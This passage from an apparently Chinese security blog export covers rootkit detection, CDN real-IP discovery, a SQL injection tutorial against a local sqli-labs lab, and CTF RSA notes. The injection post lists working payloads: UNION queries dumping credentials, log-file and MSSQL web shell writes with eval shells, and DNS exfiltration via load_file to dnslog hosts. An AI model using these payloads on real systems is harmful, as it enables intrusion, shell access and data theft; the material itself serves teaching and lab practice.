安全工具"></a>0x42 安全工具</h3><ol><li><a href="https://sourceforge.net/projects/rkhunter/" target="_blank" rel="noopener">Rootkit Hunter</a></li><li>cd rkhunter</li><li>rkhunter –check/-c #扫描本地文件</li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/18.png" alt></li><li>cat /var/log/rkhunter.log | grep Warning &gt;/tmp/scan_log.txt</li><li>rkhunter –versioncheck #检查版本</li><li>rkhunter –update #更新</li><li></li><li><a href="http://www.chkrootkit.org/" target="_blank" rel="noopener">chkrootkit</a></li><li>chkrootkit #对重要文件进行扫描</li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/19.png" alt></li><li>chkrootkit -V #查看版本信息</li></ol><h3 id="0x43-Linux预加载型恶意动态链接库后门"><a href="#0x43-Linux预加载型恶意动态链接库后门" class="headerlink" title="0x43 Linux预加载型恶意动态链接库后门"></a>0x43 <a href="https://www.freebuf.com/column/162604.html" target="_blank" rel="noopener">Linux预加载型恶意动态链接库后门</a></h3><ol><li>Linux预加载的配置文件主要是：LD_PRELOAD 和 /etc/ld.so.preload</li><li>主要技术：</li><li><ul><li>更改LD_PRELOAD的环境变量，加载恶意库文件xx.so</li></ul></li><li><ul><li>/etc/ld.so.preload加载恶意的库文件</li></ul></li><li><ul><li>更改默认的库文件/etc/ld.so.preload为其他库文件</li></ul></li><li>第二条使用的最多，通过更改/etc/ld.so.preload来预加载其他恶意的库文件来实现对系统的命令，如cat、netstat、top等进行劫持，从而达到隐藏进程、连接等目的。</li></ol><p><strong>实现劫持</strong></p><ol><li>echo $LD_PRELOAD #一开始一般为空</li><li>LD_PRELOAD=…./xx.so #指定库文件</li><li>export LD_PRELOAD #加载库文件</li><li>echo $LD_PRELOAD #这时就有了刚指定加载的库文件</li></ol><p><strong>检测</strong></p><ol><li>echo $LD_PRELOAD #是否为空</li><li>cat /etc/ld.so.preload #是否存在</li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/20.png" alt></li></ol><p><strong>处置</strong></p><ol><li>删除/etc/ld.so.preload</li><li>rm /etc/ld.so.preload</li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></li><li><a href="https://www.freebuf.com/" target="_blank" rel="noopener">https://www.freebuf.com/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 信息搜集 </tag>
            
            <tag> 安全加固 </tag>
            
            <tag> 入侵检测 </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寻找网站的真实IP</title>
      <link href="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/"/>
      <url>/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前排"><a href="#0x00-前排" class="headerlink" title="0x00 前排"></a>0x00 前排</h2><ol><li>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</li></ol><h2 id="0x10-判断是否使用CDN"><a href="#0x10-判断是否使用CDN" class="headerlink" title="0x10 判断是否使用CDN"></a>0x10 判断是否使用CDN</h2><ol><li>多地ping</li><li><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a>、<a href="https://www.wepcc.com/" target="_blank" rel="noopener">https://www.wepcc.com/</a>、<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a></li><li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/1.png" alt></li><li>nslookup</li><li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/2.png" alt></li></ol><h2 id="0X20-绕CDN找真实IP"><a href="#0X20-绕CDN找真实IP" class="headerlink" title="0X20 绕CDN找真实IP"></a>0X20 绕CDN找真实IP</h2><h3 id="0x21-子域名"><a href="#0x21-子域名" class="headerlink" title="0x21 子域名"></a>0x21 子域名</h3><ol><li>成本问题，厂商一般只对根域使用CDN，子域不使用CDN，还有分二级、三级、四级子域名。</li><li>在线域名解析与查询子域名工具：</li><li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">微步在线</a>，<a href="#jump">DNS记录</a>等等</li><li>本地脚本工具：</li><li>Layer4.2、<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a></li><li>搜索引擎<a href="https://www.google.com/" target="_blank" rel="noopener">google</a>/<a href="https://www.baidu.com/" target="_blank" rel="noopener">baidu</a>/<a href="https://cn.bing.com/" target="_blank" rel="noopener">bing</a>搜索法：</li><li>site:baidu.com -www</li><li>有的厂商只对www.xxx.com域名使用CDN，xxx.com不使用CDN，方便维护而不用等CDN缓存。</li></ol><h3 id="0x22-DNS记录"><a href="#0x22-DNS记录" class="headerlink" title="0x22 DNS记录"></a>0x22 <span id="jump">DNS记录</span></h3><ol><li><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a> #域名DNS记录查询</li><li><a href="https://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report?url=</a> #查询服务器信息</li><li><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a> #域名DNS记录查询</li><li><a href="https://tools.ipip.net/domain.php" target="_blank" rel="noopener">https://tools.ipip.net/domain.php</a> #域名DNS记录查询</li><li><a href="https://securitytrails.com/" target="_blank" rel="noopener">https://securitytrails.com/</a> #网站的历史数据</li><li><a href="https://webiplookup.com/" target="_blank" rel="noopener">https://webiplookup.com/</a></li></ol><h3 id="0x23-网络空间搜索引擎"><a href="#0x23-网络空间搜索引擎" class="headerlink" title="0x23 网络空间搜索引擎"></a>0x23 网络空间搜索引擎</h3><ol><li><a href="https://fofa.so/" target="_blank" rel="noopener">fofa</a></li><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a></li><li><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">zoomeye</a></li></ol><h3 id="0x24-SSL证书"><a href="#0x24-SSL证书" class="headerlink" title="0x24 SSL证书"></a>0x24 SSL证书</h3><ol><li>在线工具</li><li><a href="https://censys.io/" target="_blank" rel="noopener">Censys</a></li><li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/7.png" alt></li></ol><h3 id="0x25-根据HTTP特定标头查找"><a href="#0x25-根据HTTP特定标头查找" class="headerlink" title="0x25 根据HTTP特定标头查找"></a>0x25 根据HTTP特定标头查找</h3><ol><li>有些网站自带或自定义可明显识别的标头</li><li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/3.png" alt></li></ol><h3 id="0x26-根据网站返回的特定内容查找"><a href="#0x26-根据网站返回的特定内容查找" class="headerlink" title="0x26 根据网站返回的特定内容查找"></a>0x26 根据网站返回的特定内容查找</h3><ol><li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/4.png" alt></li></ol><h3 id="0x27-国外主机解析（访问）目的网站"><a href="#0x27-国外主机解析（访问）目的网站" class="headerlink" title="0x27 国外主机解析（访问）目的网站"></a>0x27 国外主机解析（访问）目的网站</h3><ol><li>国内CDN厂商一般只是针对国内的用户，国外主机访问可能直接访问目的网站的真实ip。</li></ol><h3 id="0x28-让网站主动找我"><a href="#0x28-让网站主动找我" class="headerlink" title="0x28 让网站主动找我"></a>0x28 让网站主动找我</h3><ol><li>RSS邮件订阅（若邮件系统与目的系统是不同服务器，找到的ip可能只是邮件系统的服务器），很多网站有邮件系统，甚至在内部网段，没有经过CDN的解析，通过查看邮件原文，来查看ip：</li><li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/5.png" alt></li><li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/6.png" alt></li><li>还有注册、密码找回、修改密码等等</li></ol><h3 id="0x29-利用网站漏洞来查找"><a href="#0x29-利用网站漏洞来查找" class="headerlink" title="0x29 利用网站漏洞来查找"></a>0x29 利用网站漏洞来查找</h3><ol><li>命令执行反弹shell</li><li>敏感文件泄露（phpinfo泄露、github信息泄露、配置文件可访问等等）</li><li>phpinfo搜索addr</li><li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/8.png" alt></li><li>XSS盲打</li><li>文件上传</li><li>SSRF</li></ol><h3 id="0x2A-社工"><a href="#0x2A-社工" class="headerlink" title="0x2A 社工"></a>0x2A 社工</h3><ol><li>问</li><li>猜</li><li>搜集</li><li><strong>常识判断</strong></li><li>反查ip，有很多不同的域名，那绝大多数不是真实ip。<a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">在线反查ip</a></li><li>asp/aspx网站的http响应头server字段的值不是IIS，而是nginx，那就是使用了nginx反向代理。</li><li>ping出来的ip定位到CDN服务商上，那绝大多数不是真实ip。</li><li>拿下CDN服务器后台</li></ol><h3 id="0x2B-zenmap全网扫"><a href="#0x2B-zenmap全网扫" class="headerlink" title="0x2B zenmap全网扫"></a>0x2B zenmap全网扫</h3><ol><li>匹配banner扫描全网</li></ol><h3 id="0x2C-F5-LTM解码法"><a href="#0x2C-F5-LTM解码法" class="headerlink" title="0x2C F5 LTM解码法"></a>0x2C F5 LTM解码法</h3><ol><li>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
            <tag> CDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-SQL注入"><a href="#0x00-SQL注入" class="headerlink" title="0x00 SQL注入"></a>0x00 SQL注入</h2><p><img src="/SQL%E6%B3%A8%E5%85%A5/1.jfif" alt><br>&ensp;&ensp;&ensp;&ensp;SQL注入：指web应用程序对用户输入的数据没有进行合法性判断或者过滤不严谨，攻击者可以通过在web应用程序中构造恶意SQL语句，在管理员不知情或未授权的情况下，来达到数据库执行攻击者增删改查的目的。</p><hr><h2 id="0x10-mysql注入"><a href="#0x10-mysql注入" class="headerlink" title="0x10 mysql注入"></a>0x10 mysql注入</h2><p><strong>常用函数与字段</strong></p><ol><li>user()</li><li>current_user()</li><li>database()</li><li>version()</li><li>@@datadir</li><li>@@version_compile_os</li><li>ascii()</li><li>bin()</li><li>hex()</li><li>char()</li><li>concat()</li><li>concat_ws()</li><li>group_concat()</li><li>sleep()</li><li>left()</li><li>length()</li><li>conv()</li><li>ord()</li><li>information_schema.schemata</li><li>information_schema.tables</li><li>information_schema.columns</li><li>table_schema</li><li>table_name</li></ol><h2 id="0x11-报错注入"><a href="#0x11-报错注入" class="headerlink" title="0x11 报错注入"></a>0x11 报错注入</h2><ol><li><code>http://192.168.100.3/sqli-labs/Less-1/?id=1</code> #正常访问</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/1.png" alt></li><li><code>http://192.168.100.3/sqli-labs/Less-1/?id=1&#39;</code> #简单测试</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/2.png" alt></li><li><code>http://192.168.100.3/sqli-labs/Less-1/?id=1&#39; and 1=1%23</code> #闭合测试</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/3.png" alt></li><li><code>http://192.168.100.3/sqli-labs/Less-1/?id=1&#39; and 1=11%23</code> #闭合测试</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/4.png" alt></li><li><code>http://192.168.100.3/sqli-labs/Less-1/?id=1&#39; order by 10%23</code> #列数量判断</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/5.png" alt></li><li><code>http://192.168.100.3/sqli-labs/Less-1/?id=1&#39; order by 4%23</code></li><li><img src="/SQL%E6%B3%A8%E5%85%A5/6.png" alt></li><li><code>http://192.168.100.3/sqli-labs/Less-1/?id=1&#39; order by 3%23</code></li><li><img src="/SQL%E6%B3%A8%E5%85%A5/7.png" alt></li><li>实际就3列</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/8.png" alt></li><li><code>http://192.168.100.3/sqli-labs/Less-1/?id=&#39; union select 1,2,3%23</code> #报错显示所在列</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/9.png" alt></li><li><code>http://192.168.100.3/sqli-labs/Less-1/?id=&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata%23</code> #列出所有表名，mysql5.0以上</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/10.png" alt></li><li><code>http://192.168.100.3/sqli-labs/Less-1/?id=&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;%23</code> #或者</li><li><code>http://192.168.100.3/sqli-labs/Less-1/?id=&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479%23</code></li><li><img src="/SQL%E6%B3%A8%E5%85%A5/11.png" alt></li><li><code>http://192.168.100.3/sqli-labs/Less-1/?id=&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;%23</code></li><li><img src="/SQL%E6%B3%A8%E5%85%A5/12.png" alt></li><li><code>http://192.168.100.3/sqli-labs/Less-1/?id=&#39; union select 1,group_concat(username,&#39;---&#39;,password),3 from security.users%23</code></li><li><img src="/SQL%E6%B3%A8%E5%85%A5/13.png" alt></li></ol><h2 id="0x12-字符串处理函数"><a href="#0x12-字符串处理函数" class="headerlink" title="0x12 字符串处理函数"></a>0x12 字符串处理函数</h2><ol><li>concat() #没有分隔符地连接字符串</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/15.png" alt></li><li>concat_ws() #含有分隔符地连接字符串</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/16.png" alt></li><li>group_concat() #连接一个组的所有字符串，并以逗号分隔每一条数据 </li><li><img src="/SQL%E6%B3%A8%E5%85%A5/17.png" alt></li><li>left(database(),1)=’5’ #从左到右截取几位</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/14.png" alt></li></ol><h2 id="0x13-load-file-与into-outfile"><a href="#0x13-load-file-与into-outfile" class="headerlink" title="0x13 load_file()与into outfile()"></a>0x13 load_file()与into outfile()</h2><ol><li><strong>mysql新特性secure_file_priv对读写文件的影响</strong></li><li>secure_file_priv参数用来限制load data、select…loadfile、select…outfile，加载数据，上传下载文件的</li><li>show variables like “%secure%”;  #查询</li><li>show global variables like ‘%secure%’;  #查询</li><li><strong>值为NULL：表示不允许导入或导出</strong></li><li><strong>值为/tmp/：限制导入或导出只能在/tmp/目录下</strong></li><li><strong>无值，就不限制导入或导出</strong></li><li><img src="/SQL%E6%B3%A8%E5%85%A5/18.png" alt></li><li><strong>设置</strong></li><li>windows下，my.ini里的[mysqld]后添加（默认无，有就修改，=值为NULL、/(dir)、空白）：secure_file_priv= </li><li>Linux下，my.cnf里的[mysqld]后添加：secure_file_priv= </li><li>最后重启mysql</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/19.png" alt></li><li><img src="/SQL%E6%B3%A8%E5%85%A5/20.png" alt></li><li><img src="/SQL%E6%B3%A8%E5%85%A5/21.png" alt></li><li><img src="/SQL%E6%B3%A8%E5%85%A5/22.png" alt></li><li><strong>load_file()</strong></li><li><img src="/SQL%E6%B3%A8%E5%85%A5/24.png" alt></li><li><strong>into outfile()</strong></li><li><img src="/SQL%E6%B3%A8%E5%85%A5/23.png" alt></li></ol><h2 id="0x14-全局日志getshell：利用全局变量general-log"><a href="#0x14-全局日志getshell：利用全局变量general-log" class="headerlink" title="0x14 全局日志getshell：利用全局变量general_log"></a>0x14 <strong>全局日志getshell：利用全局变量general_log</strong></h2><ol start="13"><li>show variables like “%general%”; #查询</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/25.png" alt></li><li>set global general_log=on;set global general_log_file=’C:/phpStudy/WWW/1.php’;select ‘&lt;?php phpinfo();?&gt;’; #修改配置</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/26.png" alt></li><li><img src="/SQL%E6%B3%A8%E5%85%A5/27.png" alt></li></ol><h2 id="0x15-慢查询日志getshell"><a href="#0x15-慢查询日志getshell" class="headerlink" title="0x15 慢查询日志getshell"></a>0x15 <strong>慢查询日志getshell</strong></h2><ol start="17"><li>show variables like ‘%slow%’; #查询</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/28.png" alt></li><li>set GLOBAL slow_query_log=on;set GLOBAL log_queries_not_using_indexes=on;set GLOBAL slow_query_log_file=’C:/phpStudy/WWW/slow.php’;</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/29.png" alt></li><li><img src="/SQL%E6%B3%A8%E5%85%A5/30.png" alt></li><li><img src="/SQL%E6%B3%A8%E5%85%A5/31.png" alt></li></ol><h2 id="0x16-错误日志getshell"><a href="#0x16-错误日志getshell" class="headerlink" title="0x16 错误日志getshell"></a>0x16 <strong>错误日志getshell</strong></h2><ol start="23"><li></li><li></li><li><strong>注意：</strong></li><li>路径使用/或\\</li><li>盘符下可使用c:1.php</li><li>c:1.php可使用16进制代替（0x633A312E706870）</li></ol><h2 id="0x17-SQL注入与RFI"><a href="#0x17-SQL注入与RFI" class="headerlink" title="0x17 SQL注入与RFI"></a>0x17 SQL注入与RFI</h2><ol><li>‘+union+select+’<?php eval($_request[cmd]);?>‘&amp;cmd=passthru(‘ls’);</li></ol><h2 id="0x20-Access"><a href="#0x20-Access" class="headerlink" title="0x20 Access"></a>0x20 Access</h2><ol><li>Microsoft Office Access是由微软发布的关系数据库管理系统。它结合了 MicrosoftJet Database Engine 和 图形用户界面两项特点，是 Microsoft Office 的系统程序之一。</li><li>主要用于asp、aspx脚本网站，以文件形式存在于目录中，数据库为*.mdb或*.accdb</li></ol><p><strong>判断注入</strong></p><ol><li>and 1=1 #返回正常</li><li>and 1=11 #返回错误</li></ol><h2 id="0x30-Oracle"><a href="#0x30-Oracle" class="headerlink" title="0x30 Oracle"></a>0x30 Oracle</h2><p><strong>判断oracle数据库</strong></p><ol><li>and (select count(*) from user_tables)&gt;0–</li><li>and (select count(*) from dual)&gt;0–</li></ol><p><strong>获取相关信息</strong></p><ol><li>select * from session_roles #当前用户权限</li><li>select banner from sys.v_$version where rownum=1 #当前数据库版本</li><li>使用utl_http.request #服务器出口IP</li><li>select utl_inaddr.get_host_address from dual #服务器监听IP</li><li>select member from v_$logfile where rownum=1 #服务器操作系统</li><li>select instance_name from $instance #服务器sid</li><li>select sys_context(‘userenv’,’current_user’)from dual</li></ol><p><strong>获取表名</strong></p><ol><li>select count(*) from user_tab_columns where column_name like ‘%25password%25’</li></ol><h2 id="0x40-mssql"><a href="#0x40-mssql" class="headerlink" title="0x40 mssql"></a>0x40 mssql</h2><p><strong>mssql</strong></p><pre><code>create table ccc(ddd varchar(99))insert into ccc(ddd) values(&#39;&lt;%eval request(&quot;test&quot;)%&gt;&#39;)select * into [ddd] in &#39;c:/www/test.asp;test.xls&#39; &#39;excel 4.0;&#39; from cccdrop table ccc</code></pre><pre><code>exec sp_makewebtask &#39;c:/test.php&#39;,&#39;select &quot;&lt;%eval request(&quot;test&quot;)%&gt;&quot;&#39;</code></pre><h2 id="0x40-DNS注入"><a href="#0x40-DNS注入" class="headerlink" title="0x40 DNS注入"></a>0x40 DNS注入</h2><ol><li>基于盲注分时间盲注、布尔型盲注，但都费时费力，还有无回显注入，所以使用DNS注入。</li><li><strong>原理：</strong></li><li>访问域名，就会到域名服务器递归查询域名的解析，DNS在解析后会留下记录，控制最后（自主可搭建）的DNS服务器就可以查看到明确信息。</li><li>域名长度限制在63个字符内。</li><li><strong>DNS注入配置查看：</strong></li><li>show variables like “%skip_name_resolve%”;</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/32.png" alt></li><li>off：表示会进行域名解析</li><li><strong>本地导入文件测试：</strong></li><li>show variables like “%secure%”; #条件：secure_file_priv为空白</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/35.png" alt></li><li>select load_file(‘\\dnslog.fw4hwm.dnslog.cn\1’); #fw4hwm.dnslog.cn：DNS临时域名，dnslog：可控字符</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/33.png" alt></li><li><img src="/SQL%E6%B3%A8%E5%85%A5/34.png" alt></li><li><strong>查询版本：</strong></li><li>select load_file(concat(‘\\‘,version(),’.xwxr5f.dnslog.cn\1’)); #xwxr5f.dnslog.cn：DNS临时域名</li><li><img src="/SQL%E6%B3%A8%E5%85%A5/36.png" alt></li><li>select if(load_file(concat(‘\\‘,database(),’.coob1q.dnslog.cn\1’)),1,0);</li><li>select if(load_file(concat(‘\\‘,hex(user()),’.09bjuz.dnslog.cn\1’)),1,0);</li><li><strong>使用sqlmap自动化测试DNS注入：</strong></li><li>sqlmap -u URL –dns-domain=’dnslog’ –dbs –batch</li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li>MySQL 5.1参考手册</li><li>域名测试在线DNSlog：<a href="http://www.dnslog.cn/" target="_blank" rel="noopener">http://www.dnslog.cn/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 注入 </tag>
            
            <tag> phpmyadmin </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-RSA</title>
      <link href="/CTF-RSA/"/>
      <url>/CTF-RSA/</url>
      
        <content type="html"><![CDATA[<p><img src="/CTF-RSA/rsa.png" alt></p><blockquote><p><strong>RSA加密算法，一种非对称加密算法。用途：数字签名，身份认证等</strong></p></blockquote><h2 id="0x00-简单理解RSA算法"><a href="#0x00-简单理解RSA算法" class="headerlink" title="0x00 简单理解RSA算法"></a>0x00 简单理解RSA算法</h2><blockquote><p>最大素数：p、q，p与q互质，p、q越大越安全<br>例子：p=53，q=59<br>模数：n，n=p*q，n的二进制表示时的位数就是密钥长度<br>例子：n=53*59=3127=1100 0011 0111，所以密钥长度为12位，实际中的算法是1024位或2048位</p><p>欧拉函数：φ =(p-1)*(q-1)<br>例子：φ =(53-1)(59-1)=3016</p><p>e：与φ互质，且1&lt;e&lt;φ<br>随机取e=41，e不要取3015，这样公钥私钥值一样</p><p>e的模反数：d<br>存在：(e*d)%φ=1，即e*d-1=xφ，x是整数，这里可以得d=1177，x=16</p><p>公钥：（n,e），仅公钥是公开的，其他数字都不公开<br>公钥：（3127,41）</p><p>私钥：（n,d）<br>私钥：（3127,1177）</p><p>例子：汉字“中”，utf-8编码为[e4 b8 ad]，转10进制[228 184 173]<br><img src="/CTF-RSA/1.png" alt><br>明文：m=pow(c,d,n)=c^d%n<br>密文：c=pow(m,e,n)=m^e%n<br>pow(x,y,z)：x的y次方再取模，等效pow(x,y)%z，%取余<br>明文228的密文算法：228^41%3127=521<br>184：184^41%3127=1071<br>173：173^41%3127=1322<br>密文521的解法：521^1177%3127=228<br>1071：1071^1177%3127=184<br>1322：1322^1177%3127=173</p><p>5^3 mod 7=125 mod 7=6<br>a ≡ b ( mod c)，11%3余2,5%3余2<br>11 ≡ 5 ( mod 3)<br>dp≡d mod (p−1),即(dp-d)/(p-1)=d,</p><p>公钥加密文：flag.enc<br>公钥文件：pubkey.pem<br>私钥文件：private.key</p></blockquote><h2 id="0x01-RSA-pem文件格式"><a href="#0x01-RSA-pem文件格式" class="headerlink" title="0x01 RSA pem文件格式"></a>0x01 RSA pem文件格式</h2><p><strong>PKCS#1私钥格式文件</strong></p><ol><li>—–BEGIN RSA PRIVATE KEY—–</li><li>—–END RSA PRIVATE KEY—–</li></ol><p><strong>PKCS#8私钥格式文件</strong></p><ol><li>—–BEGIN  PRIVATE KEY—–</li><li>—–END PRIVATE KEY—–</li></ol><p><strong>PEM公钥格式文件</strong></p><ol><li>—–BEGIN PUBLIC KEY—–</li><li>—–END PUBLIC KEY—–</li></ol><p><strong>PEM RSA PublicKey公钥格式文件</strong></p><ol><li>—–BEGIN RSA PUBLIC KEY—–</li><li>—–END RSA PUBLIC KEY—–</li></ol><p><strong>RSA相关工具</strong></p><ul><li>RSATool2v17：N比特位数小于256</li><li><a href="https://ipcmen.com/openssl" target="_blank" rel="noopener">openssl</a></li><li><a href="https://github.com/Ganapati/RsaCtfTool" target="_blank" rel="noopener">RsaCtfTool</a></li><li><a href="http://factordb.com/" target="_blank" rel="noopener">在线分解模数N：http://factordb.com/</a></li><li>离线工具：msieve、yafu</li></ul><h2 id="0x02-解RSA题思路"><a href="#0x02-解RSA题思路" class="headerlink" title="0x02 解RSA题思路"></a>0x02 解RSA题思路</h2><ol><li>e较大：wienner攻击</li><li>e较小：直接爆破</li><li>低加密指数广播攻击：相同低指数的e和多个相同的消息m</li><li>Coppersmith定理攻击：只有部分高位的p或q</li><li>共模攻击：相同n，相同m</li></ol><h2 id="0x03-判断是否为质数"><a href="#0x03-判断是否为质数" class="headerlink" title="0x03 判断是否为质数"></a>0x03 判断是否为质数</h2><ol><li>import gmpy2</li><li>gmpy2.is_prime(11)</li><li><img src="/CTF-RSA/6.png" alt></li><li>&gt;&gt;&gt; import Crypto</li><li>&gt;&gt;&gt; from Crypto.Util import number</li><li>&gt;&gt;&gt; Crypto.Util.number.isPrime(11)</li><li>1</li><li>&gt;&gt;&gt; Crypto.Util.number.isPrime(10)</li><li>False</li><li><img src="/CTF-RSA/7.png" alt></li></ol><h2 id="0x04-最大公约数"><a href="#0x04-最大公约数" class="headerlink" title="0x04 最大公约数"></a>0x04 最大公约数</h2><ol><li>import gmpy2</li><li>gmpy2.gcd(a,b)</li></ol><h2 id="0x05-n分解"><a href="#0x05-n分解" class="headerlink" title="0x05 n分解"></a>0x05 n分解</h2><p><strong>yafu</strong></p><ol><li><img src="/CTF-RSA/4.png" alt></li><li>n过长时，把n写入txt：yafu.exe “factor(@)” -batchfile data.txt #注意，一定要换行，即后面加个回车</li></ol><p><strong>在线分解模数N</strong></p><ol><li><img src="/CTF-RSA/8.png" alt> </li></ol><h2 id="0x06-使用openssl处理"><a href="#0x06-使用openssl处理" class="headerlink" title="0x06 使用openssl处理"></a>0x06 使用openssl处理</h2><p><strong>pem?n?e</strong> </p><ol><li>openssl rsa -pubin -text -modulus -in warmup -in public.key #分解公钥文件得n、e</li><li><img src="/CTF-RSA/15.png" alt> </li></ol><h2 id="0x07-使用RsaCtfTool处理"><a href="#0x07-使用RsaCtfTool处理" class="headerlink" title="0x07 使用RsaCtfTool处理"></a>0x07 使用RsaCtfTool处理</h2><p><strong>n/e?pem</strong></p><ol><li>python RsaCtfTool.py –createpub -n 103461035900816914121390101299049044413950405173712170434161686539878160984549 -e 65537 &gt; public.pem</li><li><img src="/CTF-RSA/10.png" alt> </li></ol><p><strong>pem/enc?m</strong></p><ol><li>python RsaCtfTool.py –publickey 公钥文件 –uncipherfile 加密文件</li><li><img src="/CTF-RSA/9.png" alt> </li></ol><p><strong>pem?key</strong></p><ol><li>python RsaCtfTool.py –publickey 公钥文件 –private [&gt; private.key(密钥文件)]</li><li><img src="/CTF-RSA/16.png" alt></li></ol><p><strong>key?p?q?e?d?n</strong></p><ol><li><img src="/CTF-RSA/16.png" alt></li><li>python RsaCtfTool.py –key private.key –dumpkey #私钥分解出n、p、q、e、d</li><li><img src="/CTF-RSA/17.png" alt></li></ol><h2 id="0x08-CTF例子"><a href="#0x08-CTF例子" class="headerlink" title="0x08 CTF例子"></a>0x08 CTF例子</h2><p><strong>n/c/e?m</strong></p><ol><li><p>e=1，即没加密，密文就是明文</p></li><li><p><img src="/CTF-RSA/11.png" alt></p></li><li><p>e=65537,n超大</p></li><li><p>n分解：yafu-x64.exe “factor(@)” -batchfile n.txt</p></li><li><p><img src="/CTF-RSA/13.png" 